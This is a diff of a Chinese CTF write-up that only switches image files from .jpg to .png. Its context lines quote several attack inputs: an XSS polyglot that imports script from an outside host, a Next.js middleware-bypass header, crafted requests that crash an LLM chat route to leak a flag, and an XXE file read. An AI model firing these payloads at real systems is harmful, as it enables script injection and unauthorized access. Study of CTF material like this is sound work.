@@ -172,11 +172,11 @@ console.log("完整 Flag:", flag);
 
 但是一点用没有，书鱼哥哥起床之后直接秒了，F12查看到js(我没找到，太粗心了)
 
-![image](./assets/002.jpg)
+![image](./assets/002.png)
 
 F12原来和直接查看源码的结果不一样，改一下js，始终改不了，说是源文件不让改，结果我新建一个`test.js`，又可以了
 
-![image](./assets/003.jpg)
+![image](./assets/003.png)
 
 ```js
   async function checkCode(){
@@ -206,7 +206,7 @@ x-middleware-subrequest: middleware
 
 ```
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
 ## Rock my Password
 
@@ -270,7 +270,7 @@ with Pool(8) as pool:
 jaVasCript:/*-/*`/*\`/*'/*"/*%0A%0a*/(/* */oNcliCk="import('//popjs.dev/lokUQ')" )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe/oNloAd="import('//popjs.dev/lokUQ')"//>\x3e
 ```
 
-![image](./assets/005.jpg)
+![image](./assets/005.png)
 
 把poc全部放进去就有了，好抽象的题目，这怕不是给平台打广告的
 
@@ -389,13 +389,13 @@ Content-Length: 12
 {"test":"å"}
 ```
 
-![image](./assets/006.jpg)
+![image](./assets/006.png)
 
 ## MaybeHappyEndingGPT
 
 看到路由`app/api/chat/route.ts`，
 
-![image](./assets/007.jpg)
+![image](./assets/007.png)
 
 可以在里面穿插恶意路由，sun师傅LLM出来的数据包
 
@@ -418,7 +418,7 @@ Priority: u=0
 
 没拿到flag的多发几次包，有点让AI宕机反应不过来那种
 
-![image](./assets/008.jpg)
+![image](./assets/008.png)
 
 ## Editor
 
@@ -488,7 +488,7 @@ if __name__ == "__main__":
 
 再刷新就发现了这个
 
-![image](./assets/010.jpg)
+![image](./assets/010.png)
 
 最后让打一个xxe，读flag.txt就好了
 
